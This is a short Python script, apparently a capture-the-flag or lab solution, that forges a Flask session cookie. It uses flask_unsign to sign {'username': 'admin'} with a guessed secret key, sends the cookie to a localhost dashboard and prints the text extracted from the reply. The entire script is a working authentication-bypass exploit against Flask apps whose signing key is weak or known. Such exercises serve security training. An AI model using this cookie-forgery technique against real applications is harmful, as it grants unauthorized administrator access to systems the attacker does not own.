from flask_unsign.session import sign
import requests

if __name__ == "__main__":
    url = 'http://localhost:8888/dashboard'
    data = {'username': 'admin'}
    cookies = {
        'session': sign(data, 'random.random(12)', )
    }
    res = requests.get(url=url, cookies=cookies).text 
    res = res.split(' : ')[1].split('</p>')[0]
    print(res)
